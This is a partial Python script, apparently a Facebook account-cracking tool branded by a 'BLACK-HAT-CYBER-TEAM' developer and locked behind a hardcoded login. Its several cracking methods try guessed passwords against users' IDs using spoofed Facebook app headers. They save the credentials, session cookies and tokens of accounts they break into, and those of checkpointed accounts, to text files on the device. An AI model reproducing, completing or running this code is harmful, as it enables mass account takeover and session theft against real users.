...
while attemps < 12345677901:
      ...
      if username == 'Tajul' and password == 'I Love U':
...
\x1b[38;5;46m__________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : BLACK-HAT-CYBER-TEAM 
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : Tajul Islam Rabbi
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : Tajul Islam Rabbi
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : Hacker25802
 \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : FILE CLONIG
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V4]
 \x1b[38;5;46m__________________________________________________
\033[32;1mONLY \033[33;1mDATA \033[34;1mWORKING \033[35;1mID ANE \033[38;5;46mREVIEW NA \033[1;97mDILE PAID HOIYE JABE\033[1;31m 
\33[1;32m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")
...
def iAmMethod3Ua():
	...
	ua = random.choice("Davik/2.1.0 (Linux; U; Android 11.0.1; Infinix X689B Build/RP1A.200720.011) [FBAN/Orca-Android;FBAV/562.0.0.63.923;FBPN/com.facebook.orca;FBLC/en_BD;FBBV/734818760;FBCR/;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X689B;FBSV/11.0.1;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.1,width=540,height=1196};FB_FW/1;]")
	return ua
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [TAJUL] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[TAJUL-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/TAJUL_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/TAJUL_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[TAJUL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/TAJUL_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [TAJUL] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/TAJUL_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/TAJUL_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[TAJUL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/TAJUL_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [TAJUL %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[TAJUL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/TAJUL_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/TAJUL_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[TAJUL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/TAJUL_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [TAJUL] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[TAJUL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/TAJUL_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/TAJUL_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[TAJUL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/TAJUL_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [TAJUL] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[TAJUL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/TAJUL_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/TAJUL_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[TAJUL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/TAJUL_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
